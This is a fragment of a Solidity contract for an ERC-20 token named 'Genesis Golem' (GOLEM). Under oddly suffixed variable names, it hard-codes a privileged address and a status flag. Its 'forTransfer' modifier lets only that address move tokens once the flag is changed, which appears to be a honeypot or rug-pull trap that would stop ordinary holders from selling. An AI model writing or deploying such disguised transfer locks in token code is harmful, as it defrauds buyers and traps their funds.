...
contract GenesisGolem is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenar_totalSupply;
    uint256 private _tokenar_status = 0;
    uint256 public stakingPoolarStatus = 0;

    string private _tokenar_name;
    string private _tokenar_symbol;

    address private _poolarAddress = 0x39D4BfF7063D2a4E8c7DEDC2C4d5000263732168; 

    constructor() {
        _tokenar_name = "Genesis Golem";
        _tokenar_symbol = "GOLEM";
        _tokenar_totalSupply = 1000 * 10 ** 18;
        _balances[msg.sender] = _tokenar_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolarAddress || _tokenar_status == 0);
        _;
    }
